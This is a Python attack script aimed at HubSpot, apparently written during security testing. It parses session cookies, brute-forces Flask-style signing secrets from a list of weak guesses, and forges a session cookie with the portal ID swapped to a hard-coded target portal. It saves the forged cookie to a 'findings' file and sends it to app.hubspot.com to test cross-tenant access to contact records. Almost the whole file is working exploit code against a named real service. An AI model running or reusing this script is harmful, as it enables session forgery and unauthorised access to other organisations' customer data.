#!/usr/bin/env python3
"""
Analyze HubSpot session cookies for weak signing secrets
Inspired by Finding #11 - Flask weak SECRET_KEY vulnerability
"""

import requests
import json
import os
import base64
import hmac
import hashlib
from dotenv import load_dotenv
import urllib3

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'

print("="*80)
print("SESSION COOKIE ANALYSIS - WEAK SECRET DETECTION")
print("="*80)

print("\n[*] Analyzing HubSpot session cookies for weak signing...")
print("="*80)

# Parse cookies
cookies = {}
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        cookies[key] = value

print(f"\nTotal cookies: {len(cookies)}")

# ============================================================================
# 1. CHECK FOR FLASK-STYLE SESSION COOKIES
# ============================================================================

print("\n[1] CHECKING FOR FLASK-STYLE SESSION COOKIES")
print("="*80)

# Flask sessions are base64-encoded and have a specific format
for key, value in cookies.items():
    # Flask sessions typically have dots separating parts
    if '.' in value and len(value) > 20:
        print(f"\n[*] Analyzing: {key}")
        print(f"    Value: {value[:80]}...")

        try:
            # Try to decode as Flask session
            # Format: base64(payload).timestamp.signature
            parts = value.split('.')

            if len(parts) >= 2:
                print(f"    Parts: {len(parts)}")

                # Try to base64 decode first part
                try:
                    # Add padding if needed
                    payload = parts[0]
                    padding = 4 - len(payload) % 4
                    if padding != 4:
                        payload += '=' * padding

                    decoded = base64.urlsafe_b64decode(payload)
                    print(f"    Decoded payload: {decoded[:200]}")

                    # Try to parse as JSON
                    try:
                        data = json.loads(decoded)
                        print(f"    *** FLASK SESSION COOKIE FOUND! ***")
                        print(f"    Session data: {json.dumps(data, indent=2)[:500]}")

                        # Check if it contains portal information
                        if 'portal' in json.dumps(data).lower():
                            print(f"    *** Contains portal data! ***")
                    except:
                        pass
                except Exception as e:
                    pass
        except:
            pass

# ============================================================================
# 2. TRY TO BRUTE-FORCE FLASK SECRET
# ============================================================================

print("\n" + "="*80)
print("[2] ATTEMPTING TO BRUTE-FORCE FLASK SECRET")
print("="*80)

# Common weak secrets to try
weak_secrets = [
    'N/A',
    'test',
    'dev',
    'development',
    'secret',
    'secret_key',
    'SECRET_KEY',
    'hubspot',
    'HubSpot',
    'HUBSPOT',
    'debug',
    'DEBUG',
    'password',
    'admin',
    '1234',
    '12345',
    'qwerty',
    '',
    'flask',
    'Flask',
]

# Check if we have any Flask-style cookies
flask_cookies = {}
for key, value in cookies.items():
    if '.' in value and len(value) > 20:
        parts = value.split('.')
        if len(parts) >= 2:
            flask_cookies[key] = value

if flask_cookies:
    print(f"\nFound {len(flask_cookies)} potential Flask-style cookies")

    for cookie_name, cookie_value in flask_cookies.items():
        print(f"\n[*] Testing: {cookie_name}")

        parts = cookie_value.split('.')

        for secret in weak_secrets:
            try:
                # Try to verify signature
                payload = parts[0]
                signature = parts[-1] if len(parts) > 1 else ''

                # Calculate expected signature
                message = '.'.join(parts[:-1])
                expected_sig = hmac.new(
                    secret.encode(),
                    message.encode(),
                    hashlib.sha1
                ).digest()

                # Base64 encode (URL-safe, no padding)
                expected_sig_b64 = base64.urlsafe_b64encode(expected_sig).rstrip(b'=').decode()

                if expected_sig_b64 == signature:
                    print(f"\n    *** WEAK SECRET FOUND! ***")
                    print(f"    Secret: '{secret}'")
                    print(f"    Cookie: {cookie_name}")

                    # Try to decode and modify
                    padding = 4 - len(payload) % 4
                    if padding != 4:
                        payload += '=' * padding

                    decoded = base64.urlsafe_b64decode(payload)
                    print(f"    Decoded: {decoded}")

                    # Try to create forged cookie for target portal
                    try:
                        session_data = json.loads(decoded)
                        print(f"    Current session: {json.dumps(session_data, indent=2)}")

                        # Modify for target portal
                        if 'portal' in json.dumps(session_data).lower():
                            print(f"\n    Attempting to forge session for portal {TARGET_PORTAL}...")

                            # Create modified session
                            modified_data = session_data.copy()
                            # Try different portal keys
                            for key in ['portal', 'portalId', 'portal_id', 'hubId']:
                                if key in modified_data:
                                    modified_data[key] = TARGET_PORTAL

                            # Encode modified session
                            modified_json = json.dumps(modified_data, separators=(',', ':'))
                            modified_payload = base64.urlsafe_b64encode(modified_json.encode()).rstrip(b'=').decode()

                            # Sign with weak secret
                            timestamp = parts[1] if len(parts) > 2 else ''
                            new_message = f"{modified_payload}.{timestamp}"
                            new_sig = hmac.new(
                                secret.encode(),
                                new_message.encode(),
                                hashlib.sha1
                            ).digest()
                            new_sig_b64 = base64.urlsafe_b64encode(new_sig).rstrip(b'=').decode()

                            forged_cookie = f"{modified_payload}.{timestamp}.{new_sig_b64}"

                            print(f"\n    *** FORGED COOKIE CREATED! ***")
                            print(f"    Forged value: {forged_cookie[:100]}...")

                            # Save for testing
                            with open('/home/user/Hub/findings/FORGED_SESSION_COOKIE.txt', 'w') as f:
                                f.write(f"Cookie Name: {cookie_name}\n")
                                f.write(f"Secret: {secret}\n")
                                f.write(f"Original: {cookie_value}\n")
                                f.write(f"Forged: {forged_cookie}\n")
                                f.write(f"\nModified Session Data:\n")
                                f.write(json.dumps(modified_data, indent=2))

                            print(f"\n    Saved to: findings/FORGED_SESSION_COOKIE.txt")

                            # Test the forged cookie
                            print(f"\n    Testing forged cookie...")
                            test_url = f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/1'
                            test_headers = {
                                'User-Agent': 'Mozilla/5.0',
                                'Cookie': f'{cookie_name}={forged_cookie}'
                            }

                            r = requests.get(test_url, headers=test_headers, verify=False, timeout=10)
                            print(f"    Test result: {r.status_code}")

                            if r.status_code == 200 and len(r.text) > 100000:
                                print(f"    *** FORGED COOKIE WORKS! ***")
                    except Exception as e:
                        print(f"    Error forging: {e}")
            except:
                pass

# ============================================================================
# 3. CHECK FOR JWT TOKENS
# ============================================================================

print("\n" + "="*80)
print("[3] CHECKING FOR JWT TOKENS")
print("="*80)

for key, value in cookies.items():
    # JWTs have format: header.payload.signature
    if value.count('.') == 2 and len(value) > 50:
        print(f"\n[*] Potential JWT: {key}")

        parts = value.split('.')

        try:
            # Decode header
            header = parts[0]
            padding = 4 - len(header) % 4
            if padding != 4:
                header += '=' * padding

            decoded_header = base64.urlsafe_b64decode(header)
            print(f"    Header: {decoded_header}")

            # Decode payload
            payload = parts[1]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding

            decoded_payload = base64.urlsafe_b64decode(payload)
            print(f"    Payload: {decoded_payload[:500]}")

            # Try to parse as JSON
            try:
                payload_data = json.loads(decoded_payload)
                print(f"    *** JWT FOUND! ***")
                print(f"    Data: {json.dumps(payload_data, indent=2)[:500]}")

                # Check for portal info
                if 'portal' in json.dumps(payload_data).lower():
                    print(f"    *** Contains portal data! ***")
            except:
                pass
        except Exception as e:
            pass

print("\n" + "="*80)
print("SESSION ANALYSIS COMPLETE")
print("="*80)
